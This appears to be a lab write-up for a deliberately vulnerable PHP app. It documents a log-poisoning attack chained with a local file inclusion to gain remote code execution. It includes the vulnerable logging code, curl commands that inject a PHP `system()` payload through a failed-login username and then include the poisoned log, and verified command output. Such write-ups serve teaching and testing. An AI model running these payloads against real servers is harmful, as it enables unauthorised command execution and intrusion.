# 12 — Log poisoning → PHP code execution (with 11)

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** Critical
- **Difficulty:** Hard

## Where

- `web/includes/visitlog.php:24-28` — `log_failed_login()` writes the
  submitted username **raw** into the visit log.
- `web/login.php:27` — calls `log_failed_login($u)` on a failed login.
- `web/contact.php:15` — `include("forms/" . $form)` (the LFI from 11).

```php
function log_failed_login($username) {
    $f = visit_log_file();
    ...
    $line = 'failed login for user ' . $username . ' at ' . date('H:i:s') . "\n";
    file_put_contents($f, $line, FILE_APPEND);
}
```

## How it works (root cause)

The username is appended to a `.log` file with no sanitisation, and PHP
time (`date()`, UTC) is used for the file name. Because the LFI in 11 can
`include` any readable file — including these logs — an attacker can plant
`<?php ... ?>` into a log and then include it. PHP executes the tags inside
the included log file.

## Exploitation steps

1. Plant PHP in the current hour's failed-login log:

   ```bash
   curl -s -d "username=<?php system('id > /tmp/osede_lfi_rce_pwned'); ?>&password=x" \
        http://localhost:8080/login.php
   ```

   (A wrong password is required so the login actually fails and the line is
   logged.)

2. Compute the log name. PHP runs in **UTC** (`LOG_DIR . 'visits-' . date('Y-m-d-H') . '.log'`), so use the current UTC hour:

   ```bash
   H=$(date -u +%Y-%m-%d-%H)
   echo "web/logs/visits-$H.log"
   ```

3. Include that log via the LFI:

   ```bash
   curl -s "http://localhost:8080/contact.php?form=../logs/visits-$H.log"
   ```

## Working PoC (verified)

After the two requests above, the file `/tmp/osede_lfi_rce_pwned` exists:

```
uid=1000(user) gid=1000(user) groups=1000(user)
```

— arbitrary command execution as the PHP-FPM user.

## Expected result / verification

- A new file created by the injected `system()` call appears on disk.
- Any command is possible (reverse shell, credential theft, …).

## Attack chain

```
failed-login username (raw to log)
  → visit log for the current UTC hour
  → LFI (11) includes the log
  → PHP tags execute → RCE
```

## Notes

- The UTC vs CEST offset is the main gotcha: the log file name must match
  PHP's `date()`, not the system's local time.
- `log_visit()` (line 20) is scoped to a fixed `$page` and the session
  username, so the failed-login path is the reliable write primitive.
